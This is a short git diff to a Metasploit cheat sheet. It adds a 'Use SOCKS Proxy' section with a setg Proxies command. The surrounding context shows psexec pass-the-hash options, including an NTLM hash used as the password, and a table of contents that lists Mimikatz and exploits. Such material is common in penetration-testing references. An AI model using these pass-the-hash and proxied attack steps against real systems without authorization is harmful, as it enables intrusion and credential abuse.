@@ -16,6 +16,7 @@
     * [Execute from Memory](#execute-from-memory)
     * [Mimikatz](#mimikatz)
     * [Pass the Hash - PSExec](#pass-the-hash---psexec)
+    * [Use SOCKS Proxy](#use-socks-proxy)
 * [Scripting Metasploit](#scripting-metasploit)
 * [Multiple transports](#multiple-transports)
 * [Best of - Exploits](#best-of---exploits)
@@ -186,6 +187,12 @@ msf exploit(psexec) > exploit
 SMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication
 SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username
 SMBUser               Lambda                                                             no        The username to authenticate as
+```
+
+### Use SOCKS Proxy
+
+```powershell
+setg Proxies socks4:127.0.0.1:1080
 ```
 
 ## Scripting Metasploit
